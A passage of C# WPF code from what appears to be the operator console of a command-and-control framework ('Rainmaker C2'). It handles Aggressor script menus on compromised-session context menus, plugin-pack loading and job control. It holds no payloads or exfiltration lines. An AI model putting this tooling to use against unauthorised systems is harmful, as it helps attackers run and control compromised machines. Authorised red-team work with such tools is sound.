            ScriptMenuTitle.Text = "插件菜单树 " + s.Menus.Count + " 个 popup / 项 " + items
                                 + " · 子菜单 " + menus + " · 分隔线 " + seps;

            // 未实现的 CS 客户端 UI 函数 (唯一的能力边界提示, 原样展示)
            var miss = new List<ScriptTextRow>();
            for (int i = 0; i < s.Missing.Count; i++) miss.Add(ScriptRow("missing", s.Missing[i], i));
            if (miss.Count == 0 && err.Length == 0)
                miss.Add(ScriptRow("missing", "(本次加载没有调用未实现的函数)", 0));
            Sync(_scriptMissing, miss);
            ScriptMissingTitle.Text = "missing 未实现的 UI 函数 " + s.Missing.Count;

            // 加载诊断 (服务端 diag + 本侧拉取失败原因)
            var diag = new List<ScriptTextRow>();
            int k = 0;
            if (err.Length > 0) diag.Add(ScriptRow("diag", "[GUI] GET /api/scripts 失败: " + err, k++));
            for (int i = 0; i < s.Diag.Count; i++) diag.Add(ScriptRow("diag", s.Diag[i], k++));
            if (diag.Count == 0) diag.Add(ScriptRow("diag", "(无诊断)", 0));
            Sync(_scriptDiag, diag);
            ScriptDiagTitle.Text = "diag 加载诊断 " + s.Diag.Count;

            // 脚本输出 (服务端 gScriptLines, 最近 2000 行)
            var outs = new List<ScriptTextRow>();
            for (int i = 0; i < s.Output.Count; i++) outs.Add(ScriptRow("out", s.Output[i], i));
            Sync(_scriptOut, outs);
            ScriptOutTitle.Text = "脚本输出 " + outs.Count + " 行";

            if (err.Length > 0)
            {
                ScriptStat.Text = "拉取失败: " + err;
                SetScriptHint("GET /api/scripts 失败: " + err);
                return;
            }

            ScriptStat.Text = "脚本 " + s.Loaded.Count + " · 命令 " + s.Commands.Count
                            + " · popup " + s.Menus.Count + " (" + s.MountsText() + ")"
                            + " · 菜单项 " + s.TotalItems
                            + " · missing " + s.Missing.Count + " · diag " + s.Diag.Count;
            if (_scriptMsg.Length == 0)
                _scriptMsg = "popup " + s.Menus.Count + " 个已挂载: " + s.MountsText()
                           + "；" + (s.Missing.Count > 0
                                ? "missing " + s.Missing.Count + " 个 CS 客户端 UI 函数未实现 (见下方 missing 列)"
                                : "本次加载没有调用未实现的 UI 函数");
            SetScriptHint(_scriptMsg);
        }

        private static ScriptTextRow ScriptRow(string kind, string text, int idx)
        {
            var r = new ScriptTextRow();
            r.Kind = kind;
            r.Text = text;
            r.Key = kind + "|" + idx;
            return r;
        }

        // ------------------------------------------------------------ 右键菜单挂载

        private string ScriptSidOfCurrent()
        {
            var row = CurrentSessionRow();
            if (row != null && row.Sid.Length > 0) return row.Sid;
            return _curSid ?? "";
        }

        /// <summary>移除上一次插入的插件菜单项 (每次打开右键菜单重建, 保证与最新脚本状态一致)。</summary>
        private static void ClearScriptItems(ItemCollection items)
        {
            for (int i = items.Count - 1; i >= 0; i--)
            {
                var fe = items[i] as FrameworkElement;
                string tag = fe == null ? null : fe.Tag as string;
                if (tag != null && tag.StartsWith(ScriptTag, StringComparison.Ordinal)) items.RemoveAt(i);
            }
        }

        /// <summary>分隔线/子菜单项构造 (统一打 Tag, 便于下次打开时清理)。</summary>
        private FrameworkElement BuildScriptNode(ScriptItem it, string sid)
        {
            if (it.IsSep)
            {
                var sp = new Separator();
                sp.Tag = ScriptTag + it.Parent + "|sep";
                return sp;
            }

            var mi = new MenuItem();
            mi.Header = it.Text.Length == 0 ? it.Raw : it.Text;
            mi.Tag = ScriptTag + it.Parent + "|" + it.Raw;

            if (it.HasChildren)
            {
                foreach (ScriptItem ch in it.Children) mi.Items.Add(BuildScriptNode(ch, sid));
                if (mi.Items.Count == 0) mi.IsEnabled = false;
                mi.ToolTip = it.Action
                    ? "子菜单 (该项自身也带脚本体, 但 REST 只按命令名执行, 子项才是可执行入口)"
                    : "子菜单";
                return mi;
            }

            if (!it.Action)
            {
                mi.IsEnabled = false;
                mi.ToolTip = "脚本没有给这一项注册执行体 (action=false), 点了也不会有动作";
                return mi;
            }

            bool isCmd = ScriptParse.IsCommand(_scripts.Commands, it.Command);
            mi.ToolTip = "POST /api/script/run  name=" + it.Command + "  $1=" + (sid.Length == 0 ? "(空)" : sid)
                       + (isCmd ? "   [命令表命中]" : "   [不在命令表中, 服务端会回『未找到脚本命令』]");
            if (isCmd) mi.FontWeight = FontWeights.Bold;
            mi.Click += async delegate { await RunScriptItemAsync(it, sid); };
            return mi;
        }

        /// <summary>把某个挂载点的插件菜单插入右键菜单; 顶层项直接展开 (CS 的 popup 语义)。</summary>
        private void AppendScriptMounts(ItemCollection items, ScriptMount mount, string sid, bool withPluginGroup)
        {
            ClearScriptItems(items);
            if (_scripts == null || _scripts.Menus.Count == 0) return;

            var host = new List<ScriptMenu>();
            foreach (ScriptMenu md in _scripts.Menus) if (md.Mount == mount && md.Items.Count > 0) host.Add(md);

            bool hasPlugin = false;
            if (withPluginGroup)
            {
                foreach (ScriptMenu md in _scripts.Menus)
                {
                    if (md.Mount == ScriptMount.Plugin) { hasPlugin = true; break; }
                }
            }
            if (host.Count == 0 && !hasPlugin) return;

            var lead = new Separator();
            lead.Tag = ScriptTag + "lead";
            items.Add(lead);

            foreach (ScriptMenu md in host)
            {
                foreach (ScriptItem it in md.Items) items.Add(BuildScriptNode(it, sid));
            }
            if (hasPlugin) items.Add(BuildPluginGroup(sid));
        }

        /// <summary>
        /// 未归类 popup 的聚合子菜单: 每个 parent 一层子菜单 (空 popup 也如实列出并灰显)。
        /// </summary>
        private MenuItem BuildPluginGroup(string sid)
        {
            var root = new MenuItem();
            root.Header = "脚本插件";
            root.Tag = ScriptTag + "plugin-group";

            var seen = new Dictionary<string, MenuItem>(StringComparer.OrdinalIgnoreCase);
            int total = 0;
            foreach (ScriptMenu md in _scripts.Menus)
            {
                if (md.Mount != ScriptMount.Plugin) continue;

                MenuItem sub;
                if (!seen.TryGetValue(md.Parent, out sub))
                {
                    sub = new MenuItem();
                    sub.Tag = ScriptTag + md.Parent;
                    sub.Header = md.Parent;
                    seen[md.Parent] = sub;
                    root.Items.Add(sub);
                }
                foreach (ScriptItem it in md.Items)
                {
                    sub.Items.Add(BuildScriptNode(it, sid));
                    total++;
                }
            }

            foreach (MenuItem sub in seen.Values)
            {
                if (sub.Items.Count == 0)
                {
                    sub.IsEnabled = false;   // popup 声明了但没有项 (原版里 view/attacks/help 就是空 popup)
                    sub.Header = sub.Header + "  (空 popup)";
                }
            }
            root.ToolTip = "未归到会话/进程/目标库的 popup, 共 " + seen.Count + " 个 / " + total + " 项";
            return root;
        }

        private void CtxSessions_Opened(object sender, RoutedEventArgs e)
        {
            var cm = sender as ContextMenu;
            if (cm == null) return;
            if (!_scriptOnce) _ = FetchScriptsAsync(false);
            var row = _ctxRow ?? CurrentSessionRow();
            AppendScriptMounts(cm.Items, ScriptMount.Session, row == null ? "" : row.Sid, true);
        }

        private void CtxProc_Opened(object sender, RoutedEventArgs e)
        {
            var cm = sender as ContextMenu;
            if (cm == null) return;
            if (!_scriptOnce) _ = FetchScriptsAsync(false);
            var row = ProcSessionRow();
            AppendScriptMounts(cm.Items, ScriptMount.Process, row == null ? "" : row.Sid, false);
        }

        private void CtxTargets_Opened(object sender, RoutedEventArgs e)
        {
            var cm = sender as ContextMenu;
            if (cm == null) return;
            if (!_scriptOnce) _ = FetchScriptsAsync(false);
            var t = _ctxTarget ?? GridTargets.SelectedItem as TargetRow;
            AppendScriptMounts(cm.Items, ScriptMount.Targets, t == null ? "" : t.Sid, false);
        }

        // ------------------------------------------------------------ 执行

        /// <summary>执行命令表里的命令 (sid 作为第一位实参, 即脚本里的 $1)。</summary>
        private async Task RunScriptNameAsync(string name, string origin)
        {
            if (string.IsNullOrEmpty(name)) { SetStatus("没有可执行的命令名"); return; }
            string sid = ScriptSidOfCurrent();
            if (sid.Length == 0) SetStatus("当前没有选中会话: " + name + " 的 $1 将为空");

            try
            {
                using (var doc = await _api.RunScriptAsync(name, sid, new string[0]))
                {
                    var root = doc.RootElement;
                    string text = ScriptParse.RunResultText(root.Bool("ok"), root.Str("error"), name);
                    _scriptMsg = "[" + origin + "] " + text;
                    SetStatus(_scriptMsg);
                    SetScriptHint(_scriptMsg);
                    AppendTermRaw("> [script] " + text);
                    await FetchScriptsAsync(false);   // 立刻带回脚本自己 print 的输出
                }
            }
            catch (Exception ex)
            {
                _scriptMsg = "[" + origin + "] " + name + " 请求失败: " + ex.Message;
                SetStatus(_scriptMsg);
                SetScriptHint(_scriptMsg);
                AppendTermRaw("> [script] " + _scriptMsg);
            }
        }

        /// <summary>执行一个菜单项: 走 /api/script/menu, 由服务端按 (parent, name) 定位菜单项本体。</summary>
        private async Task RunScriptItemAsync(ScriptItem it, string sid)
        {
            if (it == null) return;
            string raw = it.Raw.Length > 0 ? it.Raw : it.Command;
            if (raw.Length == 0) { SetStatus("该菜单项没有名字, 无法执行"); return; }

            string origin = "菜单 " + it.Parent + " / " + it.Text;
            SetScriptHint(origin + "  →  POST /api/script/menu parent=" + it.Parent + " name=" + raw
                        + (sid.Length == 0 ? " (无会话号: $1 为空)" : " sid=" + sid));
            try
            {
                using (var doc = await _api.RunScriptMenuAsync(it.Parent, raw, sid, new string[0]))
                {
                    var root = doc.RootElement;
                    string text = ScriptParse.RunResultText(root.Bool("ok"), root.Str("error"), it.Text);
                    string warn = ScriptParse.WarniText(root);
                    if (warn.Length > 0) text = text + "  " + warn;
                    _scriptMsg = "[" + origin + "] " + text;
                    SetStatus(_scriptMsg);
                    SetScriptHint(_scriptMsg);
                    AppendTermRaw("> [script] " + text);
                    await FetchScriptsAsync(false);
                }
            }
            catch (Exception ex)
            {
                _scriptMsg = "[" + origin + "] 请求失败: " + ex.Message;
                SetStatus(_scriptMsg);
                SetScriptHint(_scriptMsg);
                AppendTermRaw("> [script] " + _scriptMsg);
            }
        }

        private async void ScriptRefresh_Click(object sender, RoutedEventArgs e)
        {
            await FetchScriptsAsync(true);
        }

        private void ScriptRunCmd_Click(object sender, RoutedEventArgs e)
        {
            var row = GridScriptCmds.SelectedItem as ScriptCmdRow;
            if (row == null) { SetStatus("请先在命令列表选择一行 (双击也可执行)"); return; }
            _ = RunScriptNameAsync(row.Name, "命令列表");
        }

        private void GridScriptCmds_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = GridScriptCmds.SelectedItem as ScriptCmdRow;
            if (row == null) return;
            _ = RunScriptNameAsync(row.Name, "命令列表双击");
        }

        private void TreeScriptMenus_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var it = TreeScriptMenus.SelectedItem as ScriptItem;
            if (it == null) return;
            if (it.IsSep) { SetStatus("分隔线不可执行"); return; }
            if (it.HasChildren) { SetStatus("这是一个子菜单, 请展开后双击其中的可执行项"); return; }
            if (!it.Action) { SetStatus("该项没有执行体 (action=false): " + it.Text); return; }
            _ = RunScriptItemAsync(it, ScriptSidOfCurrent());
        }

        // ------------------------------------------------------------ 插件包 (包级选择加载)
        //
        // 数据源: GET /api/plugins (插件根下的包列表 / 当前选中 / 已加载脚本)
        //         与 POST /api/plugin/set (应用选择 或 换插件根; 服务端是"重建引擎"语义)。
        //
        // 与 2 秒单定时器约定的取舍 —— 插件包列表**不参与轮询**:
        //   1) 它是操作员显式操作的对象 (勾选 → 应用), 而服务端每次扫描都要对插件根下每个
        //      目录 WalkDir 统计 .cna 数量与字节, 2 秒一轮等于把磁盘遍历变成常态开销;
        //   2) "加载出来什么"的变化不需要靠它发现: 引擎重建会改 /api/state.scripts 的
        //      loaded 计数 / menus 计数 / commands, 既有摘要签名差分会在下一轮自动补拉
        //      /api/scripts, 菜单树 / 命令 / 诊断 / missing 照样刷新。
        // 因此只在三处拉取: 首次进入脚本页、点『刷新列表』、应用选择或切换目录之后。不新增定时器。

        private readonly ObservableCollection<PluginPack> _plugins = new ObservableCollection<PluginPack>();

        /// <summary>
        /// 手工添加的脚本 (『浏览…』对话框选中的 .cna 绝对路径)。
        /// **不限插件根目录** —— 服务端 /api/plugin/set 的 paths 收任意目录或单个 .cna,
        /// 只要它自己能定位到入口 (文件 = 它自己, 目录 = 同名主文件 / main.cna / 唯一 .cna)。
        /// 这一组与勾选的包一起合并成最终 paths (去重口径见 PluginParse.MergePaths)。
        /// </summary>
        private readonly List<string> _pluginExtra = new List<string>();

        /// <summary>
        /// 被『移除』掉的手工条目 (路径)。服务端 external[] 回显的是它自己的选中集合,
        /// 界面上删掉一条只能靠这份"排除名单"表达意图 —— 提交时这些路径不进 paths,
        /// 引擎一重建就等于卸载了它。应用成功后清空 (那时服务端才是权威)。
        /// </summary>
        private readonly List<string> _pluginDrop = new List<string>();

        /// <summary>external 面板的行集合 (服务端 external[] ∪ 本地登记, 见 PluginParse.ExternalRows)。</summary>
        private readonly ObservableCollection<PluginExternalRow> _pluginExternal = new ObservableCollection<PluginExternalRow>();

        /// <summary>
        /// 已勾选但还没应用的改动 (键 = 包路径)。刷新列表时它优先于服务端 loaded,
        /// 所以"改了勾选 → 点刷新 → 再应用"不会把操作员的勾选冲掉。
        /// </summary>
        private readonly Dictionary<string, bool> _pluginPending = new Dictionary<string, bool>(StringComparer.Ordinal);

        private PluginView _pluginView = new PluginView();
        private bool _pluginBusy;               // GET /api/plugins 防重入
        private bool _pluginOnce;               // 是否成功拉过一次
        private string _pluginRootShown = "";   // 最近一次同步进输入框的服务端 root

        /// <summary>构造函数里绑定插件包视图 (行集合与其它页面同一套 Sync 差分刷新)。</summary>
        private void InitPluginView()
        {
            GridPlugins.ItemsSource = _plugins;
            ListPluginExternal.ItemsSource = _pluginExternal;
            PluginHint.ToolTip = PluginHint.Text;
            PluginStat.ToolTip = PluginStat.Text;
            ExtHint.ToolTip = ExtHint.Text;
        }

        private void SetPluginHint(string msg)
        {
            PluginHint.Text = msg ?? "";
            PluginHint.ToolTip = PluginHint.Text;
        }

        /// <summary>
        /// 把 external 行灌进面板 (Sync 差分: 移除一条不会重建整个列表)。
        /// 空集合时整块折叠 —— 这条 Auto 行不留高度, 免得把下面的插件包表格挤小。
        /// </summary>
        private void SyncPluginExternals(PluginView v)
        {
            var rows = PluginParse.ExternalRows(v, _pluginExtra, _pluginDrop);
            Sync(_pluginExternal, rows);
            ExtArea.Visibility = rows.Count > 0 ? Visibility.Visible : Visibility.Collapsed;

            string stat = PluginParse.ExternalSummaryText(rows);
            ExtStat.Text = stat;
            ExtStat.ToolTip = stat;

            string hint = PluginParse.ExternalHint(rows);
            ExtHint.Text = hint;
            ExtHint.ToolTip = hint;
        }

        /// <summary>
        /// 拉插件包列表。服务端 ok=false 的 error 与网络/HTTP 失败原因都原样显示,
        /// 不做"拉不到就当空列表"的静默降级。
        /// </summary>
        private async Task FetchPluginsAsync(bool announce)
        {
            if (_pluginBusy) return;
            _pluginBusy = true;
            try
            {
                using (var doc = await _api.GetPluginsAsync())
                {
                    _pluginView = PluginParse.Parse(doc.RootElement);
                    _pluginOnce = true;
                    ApplyPlugins(_pluginView, "");
                    if (announce)
                    {
                        string msg = _pluginView.StatsText();
                        SetStatus(msg);
                        SetPluginHint(msg);
                    }
                }
            }
            catch (Exception ex)
            {
                ApplyPlugins(_pluginView, ex.Message);
                if (announce) SetStatus("插件列表拉取失败: " + ex.Message);
            }
            finally
            {
                _pluginBusy = false;
            }
        }

        /// <summary>把插件列表灌进表格 (Sync 差分: 勾选状态与选中行不被整体重建打断)。</summary>
        private void ApplyPlugins(PluginView v, string err)
        {
            Sync(_plugins, PluginParse.Rows(v, _pluginPending));
            SyncPluginExternals(v);

            // 插件根输入框: 只在"没被手工改过"时同步 (空, 或仍显示着上次服务端给的 root)
            string cur = (PluginRootBox.Text ?? "").Trim();
            if (v.Root.Length > 0 && (cur.Length == 0
                || string.Equals(cur, _pluginRootShown, StringComparison.OrdinalIgnoreCase)))
                PluginRootBox.Text = v.Root;
            if (v.Root.Length > 0) _pluginRootShown = v.Root;
            PluginRootBox.ToolTip = "插件根目录（服务端 --plugins-dir）。服务端当前 root: " + v.RootText();

            string stat = v.StatsText();
            if (err.Length > 0) stat = "拉取插件列表失败: " + err;
            PluginStat.Text = stat;
            PluginStat.ToolTip = stat;

            int picked = PluginParse.PickedCount(_plugins);
            string hint = err.Length > 0
                ? "GET /api/plugins 失败: " + err
                : "包 " + v.Plugins.Count + " 个 (可勾选 " + v.SelectableCount
                  + " · 无主文件 " + v.BlockedCount + ") · 已勾选 " + picked
                  + " 个 + 手工添加 " + _pluginExtra.Count
                  + " 个（勾选/添加 ≠ 已生效, 点『应用选择』才重建脚本引擎）"
                  + " · 已加载脚本文件 " + v.Loaded.Count + " 个";
            if (v.SelectedMissing.Count > 0)
                hint += " · [警告] selected 里有 " + v.SelectedMissing.Count
                      + " 个路径既不在当前插件根的列表里、也不在 external 里 (插件目录换过?)";
            SetPluginHint(hint);
        }

        /// <summary>最终要提交的 paths = 勾选的包 + 手工添加的路径 (去重, 见 MergePaths)。</summary>
        private List<string> MergedPluginPaths()
        {
            return PluginParse.MergePaths(PluginParse.PickedPaths(_plugins), _pluginExtra, _pluginDrop);
        }

        /// <summary>
        /// 应用一套包路径 (或换插件根): POST /api/plugin/set。
        /// 服务端成功时引擎已重建, 所以必须紧跟重拉 /api/plugins 与 /api/scripts;
        /// 失败时把服务端 error 原样显示, 并保留勾选改动 (改完可直接再点应用)。
        /// </summary>
        private async Task ApplyPluginPathsAsync(List<string> paths, string root, string what)
        {
            int picked = paths == null ? 0 : paths.Count;
            string body = "paths=" + picked + " 个" + (string.IsNullOrEmpty(root) ? "" : " + root=" + root);
            SetStatus(what + ": POST /api/plugin/set (" + body + ") ...");
            SetPluginHint(what + " → POST /api/plugin/set (" + body + ")");
            try
            {
                using (var doc = await _api.SetPluginsAsync(paths, root))
                {
                    var r = PluginParse.ParseSet(doc.RootElement);
                    string text = string.IsNullOrEmpty(root)
                        ? PluginParse.SetResultText(r, picked)
                        : PluginParse.RootSetText(r, root, picked);

                    SetStatus(text);
                    SetPluginHint(text);
                    AppendTermRaw("> [plugin] " + text);

                    if (!r.Ok)
                    {
                        // 失败: 服务端 error 已经进状态栏与提示行; 列表仍刷一次,
                        // 让操作员看到服务端"当前到底选中了什么"(根可能在同一次请求里已经改了)。
                        await FetchPluginsAsync(false);
                        return;
                    }

                    // 成功: 勾选已落地 → 清待应用覆盖; 引擎已重建 → 列表与脚本两个端点全量刷新
                    _pluginPending.Clear();
                    // 服务端已经按这份 paths 落地了选中集合, "移除名单"不必再留着
                    // (留着反而会让用户之后用对话框挑回同一个路径时被静默排除)
                    _pluginDrop.Clear();
                    _scriptMsg = text;                 // 脚本页的提示也给出这次重建的结果
                    await FetchPluginsAsync(false);
                    await FetchScriptsAsync(false);    // 菜单树 / 命令 / 诊断 / missing 整体刷新
                }
            }
            catch (Exception ex)
            {
                string text = what + " 请求失败: " + ex.Message;
                SetStatus(text);
                SetPluginHint(text);
                AppendTermRaw("> [plugin] " + text);
            }
        }

        private async void PluginRefresh_Click(object sender, RoutedEventArgs e)
        {
            await FetchPluginsAsync(true);
        }

        /// <summary>勾选动作只登记意图 (pending), 不立刻发请求 —— 生效靠『应用选择』。</summary>
        private void PluginCheck_Click(object sender, RoutedEventArgs e)
        {
            var cb = sender as CheckBox;
            if (cb == null) return;
            var row = cb.DataContext as PluginPack;
            if (row == null) return;

            _pluginPending[row.Path] = cb.IsChecked == true;
            int picked = PluginParse.PickedCount(_plugins);
            SetPluginHint("已勾选 " + picked + " 个包 (还没生效): 点『应用选择』才 POST /api/plugin/set 重建脚本引擎"
                        + (picked == 0 ? "；勾 0 个 = 全部卸载" : ""));
        }

        /// <summary>
        /// 『浏览…』: 弹标准文件资源管理器挑 .cna (MultiSelect), 选中的路径进"待加载集合",
        /// 与目录里勾选的包合并成最终 paths 一起 POST。
        ///
        /// 这里**选完就加载** (不像勾选那样等『应用选择』): 这个按钮的语义就是"挑文件去加载",
        /// 挑完还得再找一个按钮才生效, 等于没解决"只能从预设目录里勾"的问题。
        /// 移除是反向的破坏性操作, 仍走两步 (『移除』→『应用选择』), 免得误点即卸载。
        /// </summary>
        private async void PluginBrowse_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new Microsoft.Win32.OpenFileDialog();
            dlg.Title = "选择要加载的 .cna 脚本";
            dlg.Filter = "Aggressor 脚本 (*.cna)|*.cna|所有文件 (*.*)|*.*";
            dlg.Multiselect = true;

            bool? ok = dlg.ShowDialog(this);
            if (ok != true) return;
            string[] files = dlg.FileNames;
            if (files == null || files.Length == 0) return;

            int added = 0, dup = 0;
            foreach (string f in files)
            {
                string p = (f ?? "").Trim();
                if (p.Length == 0) continue;

                // 重新挑进来的路径不再算"被移除" —— 否则用户挑回来也不会生效
                int d = PluginParse.IndexOfPath(_pluginDrop, p);
                if (d >= 0) _pluginDrop.RemoveAt(d);

                if (PluginParse.IndexOfPath(_pluginExtra, p) >= 0) { dup++; continue; }
                _pluginExtra.Add(p);
                added++;
            }
            SyncPluginExternals(_pluginView);

            var paths = MergedPluginPaths();
            string msg = "已挑入 " + added + " 个 .cna"
                       + (dup > 0 ? " (待加载集合里已有 " + dup + " 个, 未重复添加)" : "")
                       + " → 提交 " + paths.Count + " 条路径 (勾选包 + 手工添加)";
            SetStatus(msg);
            SetPluginHint(msg);
            AppendTermRaw("> [plugin] " + msg);
            await ApplyPluginPathsAsync(paths, null, "加载手工添加的 .cna");
        }

        /// <summary>
        /// external 面板的『移除』: 只登记意图 (与勾选同一个节奏) —— 点『应用选择』才下发,
        /// 引擎重建后该路径即被卸载 (磁盘上的文件不动)。
        /// </summary>
        private void PluginExtraRemove_Click(object sender, RoutedEventArgs e)
        {
            var btn = sender as Button;
            if (btn == null) return;
            var row = btn.DataContext as PluginExternalRow;
            if (row == null) return;

            string p = (row.Path ?? "").Trim();
            if (p.Length == 0) { SetStatus("这一条没有路径, 无法移除"); return; }

            int i = PluginParse.IndexOfPath(_pluginExtra, p);
            if (i >= 0) _pluginExtra.RemoveAt(i);          // 本地待提交的: 直接丢弃
            if (PluginParse.IndexOfPath(_pluginDrop, p) < 0) _pluginDrop.Add(p);   // 服务端已选中的: 进排除名单

            SyncPluginExternals(_pluginView);

            var paths = MergedPluginPaths();
            string msg = "已移除 " + row.Name + " (待提交集合剩 " + paths.Count
                       + " 条路径) → 点『应用选择』才卸载它";
            SetStatus(msg);
            SetPluginHint(msg);
        }

        private async void PluginApply_Click(object sender, RoutedEventArgs e)
        {
            var paths = MergedPluginPaths();
            if (paths.Count == 0)
            {
                var ans = MessageBox.Show(this,
                    "当前一个包都没勾选、也没有手工添加的脚本。\n\n应用空选择 = 卸载全部插件包与手工脚本 (服务端 paths=[]):"
                    + " 脚本引擎只保留 scripts/*.cna 自研脚本, 插件菜单与命令全部消失。\n\n继续?",
                    "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
                if (ans != MessageBoxResult.OK) return;
            }
            await ApplyPluginPathsAsync(paths, null, "应用插件选择");
        }

        private async void PluginUnloadAll_Click(object sender, RoutedEventArgs e)
        {
            var ans = MessageBox.Show(this,
                "卸载全部插件包与手工添加的脚本?\n\n服务端 paths=[] 重建脚本引擎: 只留 scripts/*.cna 自研脚本,"
                + " 插件菜单与命令全部消失 (插件目录与文件不动)。\n\n继续?",
                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) return;
            _pluginExtra.Clear();
            _pluginDrop.Clear();
            await ApplyPluginPathsAsync(new List<string>(), null, "全部卸载插件包");
        }

        private async void PluginRootSet_Click(object sender, RoutedEventArgs e)
        {
            string root = (PluginRootBox.Text ?? "").Trim();
            if (root.Length == 0) { SetStatus("请先填写插件目录 (服务端 --plugins-dir 指向的目录)"); return; }
            if (string.Equals(root, _pluginRootShown, StringComparison.OrdinalIgnoreCase))
            {
                SetStatus("插件目录没变: " + root + " (要重新扫描请点『刷新列表』)");
                return;
            }

            var ans = MessageBox.Show(this,
                "切换插件目录?\n\n新目录: " + root
                + "\n\n服务端先改插件根, 再按 paths=[] 重建引擎: 当前选中的插件包**与手工添加的脚本**全部卸载,"
                + " 新目录下的包需要重新勾选加载。scripts/*.cna 自研脚本始终加载。\n\n继续?",
                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) return;

            // 旧根下的勾选对新根没有意义, 直接丢弃 (避免把旧路径提交上去被服务端整单回错);
            // 手工添加的路径也一起清 —— 服务端这次本来就是 paths=[] 全卸载, 留着界面会与引擎不符
            _pluginPending.Clear();
            _pluginExtra.Clear();
            _pluginDrop.Clear();
            await ApplyPluginPathsAsync(new List<string>(), root, "切换插件目录");
        }

        // ------------------------------------------------------------ 作业 (jobs / jobkill)
        //
        // 数据源: GET /api/state 的 jobs[] 与 jobs_running (等价 GET /api/jobs)。
        // 轮询约定不变: 仍然只有 _poll 这一个 2 秒网络定时器 —— 用 JobParse.StateSignature
        // (与 ScriptParse.StateSignature 同一套差分做法) 判断内容是否变化; 内容不变时只推进
        // "运行中"作业的耗时显示, 行集合不动, 因此选中行 / 滚动位置 / 排序都不受影响。
        //
        // 终止走 POST /api/command {sid, "jobkill <id>"}, 服务端回的 text **原样**进输出区:
        // killable=false 的作业回的是 "[-] job ... 是一次性任务, 无法中途终止: ...",
        // 这是如实行为, 不是失败 —— 不吞掉、不改写、不染成失败色。

        private readonly ObservableCollection<JobRow> _jobs = new ObservableCollection<JobRow>();

        /// <summary>最近一次 /api/state 的全量作业 (过滤前的源集合)。</summary>
        private List<JobRow> _jobAll = new List<JobRow>();

        /// <summary>最近一次作业块的解析结果 (统计条用)。</summary>
        private JobView _jobView = new JobView();

        private string _jobSig = "\u0000";   // /api/state.jobs 差分签名
        private bool _jobFilterBusy;         // 下拉重建时的重入保护
        private int _jobMsgLines;            // 输出区行数 (标题计数用)

        /// <summary>构造函数里绑定作业视图的集合 (与其它标签页同一套 Sync 差分刷新)。</summary>
        private void InitJobView()
        {
            SyncJobSidItems();
            JobHint.ToolTip = JobHint.Text;
            JobStat.Text = "尚未同步 (GET /api/state.jobs)";
        }

        private static long NowSec()
        {
            return DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        }

        /// <summary>
        /// /api/state.jobs 的差分分发。签名变化才换行集合 (Sync 原地合并, 不重建表),
        /// 签名不变只推进运行中作业的耗时 —— 与脚本页的摘要签名同一套模式, 不新增定时器。
        /// </summary>
        private void ApplyJobs(JsonElement root)
        {
            var v = JobParse.State(root);
            _jobView = v;
            string sig = JobParse.StateSignature(root);

            if (sig.Length == 0)
            {
                // 旧版服务端没给 jobs 数组: 如实说明, 清空表格而不是显示陈旧数据
                if (_jobSig.Length > 0)
                {
                    _jobAll = new List<JobRow>();
                    _jobSig = "";
                    Sync(_jobs, _jobAll);
                }
                JobStat.Text = "服务端未返回 /api/state.jobs —— 作业页不可用 (旧版服务端?)";
                JobCount.Text = "0 个";
                return;
            }

            bool changed = (sig != _jobSig);
            _jobSig = sig;
            if (changed) _jobAll = v.Jobs;

            JobParse.Touch(_jobAll, NowSec());   // 运行中作业的耗时随时间推进
            SyncJobSidItems();
            ApplyJobRows();

            JobStat.Text = v.StatsText();
        }

        /// <summary>按当前过滤条件刷新可见行 (纯客户端, 不发请求)。</summary>
        private void ApplyJobRows()
        {
            bool runningOnly = JobRunningBox.IsChecked == true;
            string sid = JobFilterSid();
            List<JobRow> visible = JobParse.Filter(_jobAll, sid, runningOnly);

            Sync(_jobs, visible);
            JobCount.Text = _jobs.Count + " / " + _jobAll.Count + " 个";
            if (sid.Length > 0 || runningOnly)
            {
                var parts = new List<string>();
                if (sid.Length > 0) parts.Add("会话 " + sid);
                if (runningOnly) parts.Add("只看 running");
                JobCount.Text += "（" + string.Join(" + ", parts.ToArray()) + "）";
            }
        }

        /// <summary>当前过滤用的会话号: 空串 = 全部会话; "跟随"项取当前附着会话。</summary>
        private string JobFilterSid()
        {
            var it = JobSidBox.SelectedItem as JobSidItem;
            if (it == null) return "";
            if (it.Follow) return _curSid ?? "";
            return it.Sid;
        }

        /// <summary>会话下拉的差量维护 (Key + Text 都没变就不重建, 不打断用户选择)。</summary>
        private void SyncJobSidItems()
        {
            var labels = new List<string>();
            for (int i = 0; i < _sessions.Count; i++)
            {
                SessionRow s = _sessions[i];
                labels.Add(s.Sid + "   " + s.User + "@" + s.Host + "   proto=" + s.Proto);
            }

            var fresh = JobParse.SidItems(labels, _curSid ?? "");
            var cur = JobSidBox.ItemsSource as List<JobSidItem>;
            if (JobParse.SameSidItems(cur, fresh)) return;

            var sel = JobSidBox.SelectedItem as JobSidItem;
            string key = sel == null ? "all" : sel.Key;

            _jobFilterBusy = true;
            try
            {
                JobSidBox.ItemsSource = fresh;
                JobSidBox.SelectedItem = JobParse.PickSid(fresh, key);
            }
            finally
            {
                _jobFilterBusy = false;
            }
        }

        private void JobSidBox_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (_jobFilterBusy) return;
            ApplyJobRows();
        }

        private void JobRunningBox_Changed(object sender, RoutedEventArgs e)
        {
            if (_jobFilterBusy) return;
            ApplyJobRows();
        }

        private async void JobRefresh_Click(object sender, RoutedEventArgs e)
        {
            await PollAsync();
            SetStatus("作业已刷新: 全部 " + _jobAll.Count + " 个 / 显示 " + _jobs.Count
                      + " 个 (GET /api/state.jobs)");
        }

        private void GridJobs_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null) dr.IsSelected = true;
        }

        /// <summary>把一行信息写进作业页输出区 (不弹框, 保留历史; 服务端原话逐字进这里)。</summary>
        private void JobWrite(string text)
        {
            if (string.IsNullOrEmpty(text)) return;
            if (JobMsg.Text.StartsWith("就绪", StringComparison.Ordinal)) JobMsg.Clear();

